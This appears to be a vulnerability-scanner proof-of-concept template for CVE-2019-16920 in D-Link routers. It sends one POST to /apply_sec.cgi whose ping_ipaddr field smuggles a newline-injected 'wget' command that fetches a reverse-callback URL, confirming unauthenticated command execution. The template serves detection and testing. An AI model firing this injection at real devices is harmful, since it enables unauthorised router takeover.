name: yaml-poc-dlink-router-unauthorized_access-CVE-2019-16920
binding: e26d6bbc-bebd-4e11-a3fa-c788c1ce47f5
detail:
    author: system_user
    links:
        - https://fortiguard.com/zeroday/FG-VD-19-117
        - https://medium.com/%4080vul/determine-the-device-model-affected-by-cve-2019-16920-by-zoomeye-bf6fec7f9bb3
        - https://medium.com/@80vul/determine-the-device-model-affected-by-cve-2019-16920-by-zoomeye-bf6fec7f9bb3
        - https://www.kb.cert.org/vuls/id/766427
        - https://www.seebug.org/vuldb/ssvid-98079
    vulnerability:
        id: 0b25e446-276d-4729-8d5c-fa534ad2b8bc
        level: critical
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /apply_sec.cgi
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20{{reverseURL}}
            follow_redirects: true
        expression: response.status == 200 && reverse.wait(5)
expression: r0()
